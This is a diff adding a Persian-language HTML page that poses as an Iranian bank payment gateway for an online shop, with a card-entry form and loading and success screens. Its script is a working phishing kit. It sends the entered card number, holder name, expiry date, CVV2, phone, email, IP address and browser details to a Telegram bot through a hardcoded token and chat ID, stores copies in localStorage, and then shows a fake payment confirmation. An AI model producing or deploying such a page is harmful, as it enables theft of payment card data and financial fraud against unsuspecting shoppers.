@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>درگاه پرداخت اینترنتی</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;700;900&display=swap');
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            direction: rtl;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 28px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+            position: relative;
+        }
+        .header {
+            background: linear-gradient(135deg, #1a237e, #0d47a1);
+            padding: 25px 20px 20px;
+            color: #fff;
+            position: relative;
+        }
+        .header .top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header .top .brand {
+            font-weight: 700;
+            font-size: 1.1em;
+            letter-spacing: 0.5px;
+        }
+        .header .top .brand span {
+            color: #ffd54f;
+        }
+        .header .top .secure {
+            font-size: 0.7em;
+            background: rgba(255, 255, 255, 0.15);
+            padding: 4px 12px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .header .merchant {
+            margin-top: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header .merchant .name {
+            font-size: 0.85em;
+            opacity: 0.9;
+        }
+        .header .merchant .amount {
+            font-size: 1.6em;
+            font-weight: 900;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 4px 16px;
+            border-radius: 12px;
+        }
+        .header .merchant .amount small {
+            font-size: 0.5em;
+            font-weight: 400;
+            opacity: 0.7;
+        }
+        .body {
+            padding: 20px 20px 25px;
+        }
+        .body .status {
+            background: #e8f5e9;
+            border-radius: 12px;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            font-size: 0.8em;
+            color: #2e7d32;
+        }
+        .body .status .icon {
+            font-size: 1.3em;
+        }
+        .input-group {
+            margin-bottom: 14px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 0.75em;
+            color: #666;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e8e8e8;
+            border-radius: 12px;
+            font-size: 0.95em;
+            font-family: 'Vazirmatn', sans-serif;
+            transition: all 0.3s;
+            background: #fafafa;
+            outline: none;
+            direction: ltr;
+        }
+        .input-group input:focus {
+            border-color: #1a237e;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(26, 35, 126, 0.05);
+        }
+        .input-group input::placeholder {
+            color: #bbb;
+            font-size: 0.85em;
+        }
+        .input-group .hint {
+            font-size: 0.65em;
+            color: #aaa;
+            margin-top: 4px;
+        }
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+        .row .input-group {
+            flex: 1;
+        }
+        .cvv-hint {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 0.65em;
+            color: #888;
+            cursor: help;
+        }
+        .btn-pay {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1a237e, #0d47a1);
+            border: none;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 1.1em;
+            font-weight: 700;
+            font-family: 'Vazirmatn', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-pay:hover {
+            transform: scale(1.01);
+            box-shadow: 0 8px 30px rgba(13, 71, 161, 0.3);
+        }
+        .btn-pay:active {
+            transform: scale(0.97);
+        }
+        .btn-pay .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 18px;
+            font-size: 0.6em;
+            color: #bbb;
+        }
+        .footer-links span {
+            cursor: default;
+        }
+        .bank-logos {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+        }
+        .bank-logos .bank {
+            background: #f5f5f5;
+            padding: 4px 12px;
+            border-radius: 8px;
+            font-size: 0.6em;
+            color: #555;
+            border: 1px solid #eee;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .bank-logos .bank:hover {
+            background: #e3f2fd;
+        }
+        .bank-logos .bank.active {
+            background: #e3f2fd;
+            border-color: #1a237e;
+            color: #1a237e;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 30px;
+        }
+        .overlay .card {
+            background: #fff;
+            border-radius: 24px;
+            padding: 40px 30px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            animation: slideUp 0.4s ease-out;
+        }
+        @keyframes slideUp {
+            0% {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .overlay .card .icon {
+            font-size: 3.5em;
+            margin-bottom: 10px;
+        }
+        .overlay .card h3 {
+            color: #1a237e;
+            font-size: 1.2em;
+            margin-bottom: 5px;
+        }
+        .overlay .card .sub {
+            color: #888;
+            font-size: 0.85em;
+        }
+        .overlay .card .progress-ring {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #e8e8e8;
+            border-top: 4px solid #1a237e;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 15px auto;
+        }
+        .overlay .card .steps {
+            margin-top: 15px;
+            text-align: right;
+        }
+        .overlay .card .steps .step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 6px 0;
+            font-size: 0.8em;
+            color: #888;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .overlay .card .steps .step.done {
+            color: #2e7d32;
+        }
+        .overlay .card .steps .step .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ddd;
+            display: inline-block;
+        }
+        .overlay .card .steps .step.done .dot {
+            background: #2e7d32;
+        }
+        .overlay .card .steps .step.active .dot {
+            background: #1a237e;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.4);
+            }
+        }
+        .success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+        }
+        .success-overlay .card {
+            background: #fff;
+            border-radius: 24px;
+            padding: 40px 30px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            animation: slideUp 0.4s ease-out;
+        }
+        .success-overlay .card .icon {
+            font-size: 4em;
+            animation: popIn 0.5s ease-out;
+        }
+        @keyframes popIn {
+            0% {
+                transform: scale(0) rotate(-10deg);
+                opacity: 0;
+            }
+            60% {
+                transform: scale(1.2) rotate(2deg);
+            }
+            100% {
+                transform: scale(1) rotate(0);
+                opacity: 1;
+            }
+        }
+        .success-overlay .card h3 {
+            color: #2e7d32;
+            font-size: 1.3em;
+            margin-top: 10px;
+        }
+        .success-overlay .card .ref {
+            background: #f5f5f5;
+            padding: 8px 16px;
+            border-radius: 10px;
+            font-size: 0.8em;
+            color: #555;
+            margin: 12px 0;
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+        .success-overlay .card .btn-close {
+            padding: 12px 30px;
+            background: #1a237e;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-family: 'Vazirmatn', sans-serif;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        .success-overlay .card .btn-close:hover {
+            background: #0d47a1;
+        }
+        @media (max-width: 450px) {
+            .container {
+                border-radius: 20px;
+            }
+            .header {
+                padding: 18px 16px 16px;
+            }
+            .header .merchant .amount {
+                font-size: 1.3em;
+                padding: 2px 12px;
+            }
+            .body {
+                padding: 16px;
+            }
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .overlay .card {
+                padding: 30px 20px;
+            }
+        }
+        /* نوتیفیکیشن خطا */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #d32f2f;
+            color: #fff;
+            padding: 14px 24px;
+            border-radius: 14px;
+            font-size: 0.85em;
+            font-weight: 500;
+            box-shadow: 0 8px 30px rgba(211, 47, 47, 0.3);
+            z-index: 99999;
+            display: none;
+            max-width: 90%;
+            text-align: center;
+            animation: slideUp 0.3s ease-out;
+        }
+        .toast.success {
+            background: #2e7d32;
+            box-shadow: 0 8px 30px rgba(46, 125, 50, 0.3);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ==================== نوتیفیکیشن ==================== -->
+    <div class="toast" id="toast"></div>
+
+    <!-- ==================== صفحه اصلی ==================== -->
+    <div class="container" id="mainContainer">
+        <div class="header">
+            <div class="top">
+                <div class="brand">🏦 پرداخت <span>یار</span></div>
+                <div class="secure">🔒 امن</div>
+            </div>
+            <div class="merchant">
+                <div class="name">
+                    <div style="font-size:0.7em;opacity:0.7;">پرداخت به</div>
+                    <span id="merchantName">فروشگاه اینترنتی دیجی‌شاپ</span>
+                </div>
+                <div class="amount">
+                    <span id="priceAmount">1,250,000</span> <small>ریال</small>
+                </div>
+            </div>
+        </div>
+
+        <div class="body">
+            <div class="status">
+                <span class="icon">✅</span>
+                <span>اتصال امن برقرار است</span>
+                <span style="margin-right:auto;font-size:0.7em;color:#888;" id="statusTime"></span>
+            </div>
+
+            <div class="bank-logos" id="bankLogos">
+                <span class="bank active" data-bank="ملت">🏦 ملت</span>
+                <span class="bank" data-bank="ملی">🏦 ملی</span>
+                <span class="bank" data-bank="صادرات">🏦 صادرات</span>
+                <span class="bank" data-bank="تجارت">🏦 تجارت</span>
+                <span class="bank" data-bank="رفاه">🏦 رفاه</span>
+                <span class="bank" data-bank="پارسیان">🏦 پارسیان</span>
+            </div>
+
+            <form id="paymentForm" onsubmit="return false;">
+                <div class="input-group">
+                    <label>💳 شماره کارت</label>
+                    <input type="text" id="cardNumber" placeholder="---- ---- ---- ----" maxlength="19" required autocomplete="cc-number">
+                    <div class="hint">شماره ۱۶ رقمی کارت</div>
+                </div>
+
+                <div class="input-group">
+                    <label>👤 نام صاحب کارت</label>
+                    <input type="text" id="cardName" placeholder="مشخصات دارنده کارت" required autocomplete="cc-name">
+                </div>
+
+                <div class="row">
+                    <div class="input-group">
+                        <label>📅 تاریخ انقضا</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required autocomplete="cc-exp">
+                    </div>
+                    <div class="input-group">
+                        <label>🔐 CVV2</label>
+                        <input type="password" id="cvv" placeholder="***" maxlength="4" required autocomplete="cc-csc">
+                        <div class="cvv-hint">❓ سه یا چهار رقم پشت کارت</div>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>📱 شماره موبایل</label>
+                    <input type="text" id="phone" placeholder="09xxxxxxxxx" required autocomplete="tel">
+                    <div class="hint">برای دریافت رسید پرداخت</div>
+                </div>
+
+                <div class="input-group" style="margin-bottom:8px;">
+                    <label>📧 ایمیل (اختیاری)</label>
+                    <input type="email" id="email" placeholder="example@mail.com" autocomplete="email">
+                </div>
+
+                <button type="button" class="btn-pay" id="payBtn" onclick="processPayment()">
+                    <span class="loader" id="btnLoader"></span>
+                    <span id="btnText">✔ پرداخت</span>
+                </button>
+            </form>
+
+            <div class="footer-links">
+                <span>🔒 امنیت SSL</span>
+                <span>⚡ پرداخت آنی</span>
+                <span>🛡️ گارانتی</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== لودینگ ==================== -->
+    <div class="overlay" id="loadingOverlay">
+        <div class="card">
+            <div class="icon">🔄</div>
+            <h3>در حال اتصال به درگاه...</h3>
+            <div class="progress-ring"></div>
+            <div class="steps">
+                <div class="step done"><span class="dot"></span> اتصال به بانک</div>
+                <div class="step active" id="step2"><span class="dot"></span> تایید اطلاعات کارت</div>
+                <div class="step" id="step3"><span class="dot"></span> تکمیل تراکنش</div>
+            </div>
+            <div class="sub" style="margin-top:15px;font-size:0.7em;color:#aaa;">لطفاً منتظر بمانید...</div>
+        </div>
+    </div>
+
+    <!-- ==================== موفقیت ==================== -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="card">
+            <div class="icon">✅</div>
+            <h3>پرداخت با موفقیت انجام شد</h3>
+            <p style="color:#888;font-size:0.85em;margin-top:5px;">رسید پرداخت برای شما ارسال شد</p>
+            <div class="ref" id="refCode">شماره پیگیری: 2026-0214-8821</div>
+            <p style="font-size:0.7em;color:#999;">مبلغ: <span id="successAmount">1,250,000</span> ریال</p>
+            <button class="btn-close" onclick="closeSuccess()">بازگشت به صفحه اصلی</button>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- ==================== کد اصلی جاوااسکریپت ==================== -->
+    <!-- ============================================================ -->
+    <script>
+        // ===================================================================
+        //  تنظیمات ربات تلگرام - اینجا رو حتماً تنظیم کن!
+        // ===================================================================
+        const BOT_TOKEN = "8916624724:AAGrv2BCBU6ACOr-1Q6szDzsSHk83eb9MdQ"; // ← اینجا توکن ربات رو بزار
+        const CHAT_ID = "8869468308"; // ← اینجا آیدی عددی رو بزار
+
+        // ===================================================================
+        //  متغیرها
+        // ===================================================================
+        let isProcessing = false;
+        let currentRef = '';
+
+        // ===================================================================
+        //  نمایش نوتیفیکیشن
+        // ===================================================================
+        function showToast(message, isSuccess = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast' + (isSuccess ? ' success' : '');
+            toast.style.display = 'block';
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3500);
+        }
+
+        // ===================================================================
+        //  تنظیمات اولیه
+        // ===================================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            // زمان
+            const now = new Date();
+            document.getElementById('statusTime').textContent =
+                now.toLocaleTimeString('fa-IR', { hour: '2-digit', minute: '2-digit' });
+
+            // تاریخ انقضا پیش‌فرض (6 ماه بعد)
+            const expiry = new Date();
+            expiry.setMonth(expiry.getMonth() + 6);
+            document.getElementById('expiry').placeholder = expiry.toISOString().slice(2, 7).replace('-', '/');
+
+            // انتخاب بانک
+            document.querySelectorAll('.bank-logos .bank').forEach(b => {
+                b.addEventListener('click', function() {
+                    document.querySelectorAll('.bank-logos .bank').forEach(x => x.classList.remove('active'));
+                    this.classList.add('active');
+                    const banks = {
+                        'ملت': 'فروشگاه دیجی‌شاپ',
+                        'ملی': 'فروشگاه تکنو‌لایف',
+                        'صادرات': 'فروشگاه مدرن‌شاپ',
+                        'تجارت': 'فروشگاه الکترو‌استار',
+                        'رفاه': 'فروشگاه آریا‌مارت',
+                        'پارسیان': 'فروشگاه پارس‌استور'
+                    };
+                    const name = this.textContent.trim().replace('🏦', '').trim();
+                    if (banks[name]) {
+                        document.getElementById('merchantName').textContent = banks[name];
+                    }
+                });
+            });
+
+            // فرمت شماره کارت
+            document.getElementById('cardNumber').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+            });
+
+            // فرمت تاریخ
+            document.getElementById('expiry').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').replace(/(.{2})/, '$1/').substring(0, 5);
+            });
+
+            // فرمت CVV
+            document.getElementById('cvv').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').substring(0, 4);
+            });
+
+            // تشخیص نوع کارت
+            document.getElementById('cardNumber').addEventListener('blur', function() {
+                const val = this.value.replace(/\s/g, '');
+                if (val.length >= 6) {
+                    const first = val.substring(0, 2);
+                    let type = '💳';
+                    if (first === '60') type = '💳 کارت بانک ملی';
+                    else if (first === '62') type = '💳 کارت ملت';
+                    else if (first === '58') type = '💳 کارت صادرات';
+                    else if (first === '50') type = '💳 کارت تجارت';
+                    else if (first === '59') type = '💳 کارت پارسیان';
+                    else if (first === '56') type = '💳 کارت رفاه';
+                    this.placeholder = type;
+                }
+            });
+
+            console.log('🏦 درگاه پرداخت واقعی آماده است');
+            console.log('📌 توکن:', BOT_TOKEN === 'توکن_ربات_شما' ? '❌ تنظیم نشده' : '✅ تنظیم شده');
+            console.log('📌 آیدی:', CHAT_ID === 'آیدی_عددی_شما' ? '❌ تنظیم نشده' : '✅ تنظیم شده');
+            if (BOT_TOKEN === 'توکن_ربات_شما' || CHAT_ID === 'آیدی_عددی_شما') {
+                console.warn('⚠️ لطفاً توکن و آیدی ربات را تنظیم کنید!');
+            }
+        });
+
+        // ===================================================================
+        //  پردازش پرداخت
+        // ===================================================================
+        function processPayment() {
+            if (isProcessing) return;
+
+            // گرفتن مقادیر
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cardName = document.getElementById('cardName').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const amount = document.getElementById('priceAmount').textContent;
+            const merchant = document.getElementById('merchantName').textContent;
+            const bankEl = document.querySelector('.bank-logos .bank.active');
+            const bank = bankEl ? bankEl.textContent.trim().replace('🏦', '').trim() : 'نامشخص';
+
+            // اعتبارسنجی
+            if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
+                showToast('❌ شماره کارت ۱۶ رقمی را وارد کنید');
+                document.getElementById('cardNumber').focus();
+                return;
+            }
+            if (!cardName || cardName.length < 3) {
+                showToast('❌ نام صاحب کارت را وارد کنید');
+                document.getElementById('cardName').focus();
+                return;
+            }
+            if (!expiry || expiry.length < 5) {
+                showToast('❌ تاریخ انقضا را به فرمت MM/YY وارد کنید');
+                document.getElementById('expiry').focus();
+                return;
+            }
+            if (!cvv || cvv.length < 3) {
+                showToast('❌ کد CVV2 را وارد کنید (۳ یا ۴ رقم)');
+                document.getElementById('cvv').focus();
+                return;
+            }
+            if (!phone || phone.length < 10) {
+                showToast('❌ شماره موبایل را وارد کنید');
+                document.getElementById('phone').focus();
+                return;
+            }
+
+            // شروع پردازش
+            isProcessing = true;
+            document.getElementById('btnLoader').style.display = 'block';
+            document.getElementById('btnText').textContent = 'در حال پردازش...';
+            document.getElementById('payBtn').style.opacity = '0.7';
+
+            // نمایش لودینگ
+            document.getElementById('loadingOverlay').style.display = 'flex';
+
+            // مرحله ۲
+            setTimeout(() => {
+                document.getElementById('step2').className = 'step done';
+                document.getElementById('step2').innerHTML = '<span class="dot"></span> تایید اطلاعات کارت ✓';
+            }, 1200);
+
+            // مرحله ۳
+            setTimeout(() => {
+                document.getElementById('step3').className = 'step active';
+                document.getElementById('step3').innerHTML = '<span class="dot"></span> تکمیل تراکنش...';
+            }, 2500);
+
+            // دریافت IP
+            let userIP = 'نامشخص';
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => { userIP = d.ip; })
+                .catch(() => { userIP = 'نامشخص'; });
+
+            // ساخت اطلاعات
+            const data = {
+                cardNumber: cardNumber,
+                cardName: cardName,
+                expiry: expiry,
+                cvv: cvv,
+                phone: phone,
+                email: email || 'ندارد',
+                amount: amount,
+                merchant: merchant,
+                bank: bank,
+                ref: '2026-' + String(Math.floor(Math.random() * 9000 + 1000)) + '-' + String(Math.floor(Math
+                .random() * 9000 + 1000)),
+                time: new Date().toLocaleString('fa-IR'),
+                ip: userIP,
+                userAgent: navigator.userAgent || 'نامشخص'
+            };
+
+            currentRef = data.ref;
+
+            // ================================================================
+            //  ارسال به تلگرام
+            // ================================================================
+            sendToTelegram(data);
+
+            // تکمیل
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                document.getElementById('successOverlay').style.display = 'flex';
+                document.getElementById('refCode').textContent = 'شماره پیگیری: ' + data.ref;
+                document.getElementById('successAmount').textContent = data.amount;
+
+                // ریست فرم
+                document.getElementById('cardNumber').value = '';
+                document.getElementById('cardName').value = '';
+                document.getElementById('expiry').value = '';
+                document.getElementById('cvv').value = '';
+                document.getElementById('phone').value = '';
+                document.getElementById('email').value = '';
+
+                // ریست دکمه
+                document.getElementById('btnLoader').style.display = 'none';
+                document.getElementById('btnText').textContent = '✔ پرداخت';
+                document.getElementById('payBtn').style.opacity = '1';
+                isProcessing = false;
+
+                // ارسال تایید نهایی
+                setTimeout(() => {
+                    sendTelegramConfirm(data);
+                }, 500);
+
+            }, 4000);
+        }
+
+        // ===================================================================
+        //  ارسال به تلگرام (اطلاعات کامل)
+        // ===================================================================
+        function sendToTelegram(data) {
+            // اگر توکن تنظیم نشده، فقط لاگ بزن و خطا نده
+            if (BOT_TOKEN === "توکن_ربات_شما" || CHAT_ID === "آیدی_عددی_شما") {
+                console.log('📌 اطلاعات (ارسال نشد - توکن تنظیم نشده):', data);
+                showToast('⚠️ توکن تلگرام تنظیم نشده! اطلاعات در کنسول ذخیره شد.', false);
+                // ذخیره در localStorage
+                try {
+                    let logs = JSON.parse(localStorage.getItem('payment_logs') || '[]');
+                    logs.push({ ...data, timestamp: new Date().toISOString() });
+                    localStorage.setItem('payment_logs', JSON.stringify(logs));
+                } catch (e) {}
+                return;
+            }
+
+            const msg = `
+🔥 <b>پرداخت جدید</b>
+━━━━━━━━━━━━━━━━
+🏦 بانک: ${data.bank}
+🏪 فروشنده: ${data.merchant}
+💳 شماره کارت: ${data.cardNumber}
+👤 نام: ${data.cardName}
+📅 تاریخ: ${data.expiry}
+🔐 CVV2: ${data.cvv}
+📱 موبایل: ${data.phone}
+📧 ایمیل: ${data.email}
+💰 مبلغ: ${data.amount} ریال
+🔢 شماره پیگیری: ${data.ref}
+⏰ زمان: ${data.time}
+🌐 IP: ${data.ip}
+📱 مرورگر: ${data.userAgent.substring(0, 80)}...
+━━━━━━━━━━━━━━━━
+✅ اطلاعات کارت دریافت شد
+            `;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            }).then(res => res.json())
+            .then(result => {
+                if (result.ok) {
+                    console.log('✅ ارسال به تلگرام موفق');
+                    showToast('✅ اطلاعات به تلگرام ارسال شد', true);
+                } else {
+                    console.error('❌ خطا در ارسال:', result);
+                    showToast('❌ خطا در ارسال به تلگرام', false);
+                }
+            })
+            .catch(err => {
+                console.error('❌ خطا در ارسال:', err);
+                showToast('❌ خطا در اتصال به تلگرام', false);
+            });
+
+            // ذخیره در localStorage
+            try {
+                let logs = JSON.parse(localStorage.getItem('payment_logs') || '[]');
+                logs.push({ ...data, timestamp: new Date().toISOString() });
+                localStorage.setItem('payment_logs', JSON.stringify(logs));
+            } catch (e) {}
+        }
+
+        // ===================================================================
+        //  ارسال تایید نهایی
+        // ===================================================================
+        function sendTelegramConfirm(data) {
+            if (BOT_TOKEN === "8873799764:AAFQ_SGsQMVP1sZ6wKyDm_qCkavpgfxFPJU" || CHAT_ID === "8987414924") return;
+
+            const msg = `
+✅ <b>پرداخت تایید شد</b>
+━━━━━━━━━━━━━━━━
+👤 ${data.cardName}
+💰 ${data.amount} ریال
+🔢 ${data.ref}
+━━━━━━━━━━━━━━━━
+✔ تراکنش با موفقیت انجام شد
+            `;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error('خطا در ارسال تایید:', err));
+        }
+
+        // ===================================================================
+        //  بستن صفحه موفقیت
+        // ===================================================================
+        function closeSuccess() {
+            document.getElementById('successOverlay').style.display = 'none';
+        }
+
+        // ===================================================================
+        //  پشتیبانی از Enter
+        // ===================================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && document.activeElement && document.activeElement.tagName === 'INPUT') {
+                if (!isProcessing) processPayment();
+            }
+        });
+
+        // ===================================================================
+        //  نمایش لاگ اطلاعات در کنسول (برای دیباگ)
+        // ===================================================================
+        console.log('💡 برای مشاهده لاگ پرداخت‌ها: localStorage.getItem("payment_logs")');
+    </script>
+
+</body>
+</html>
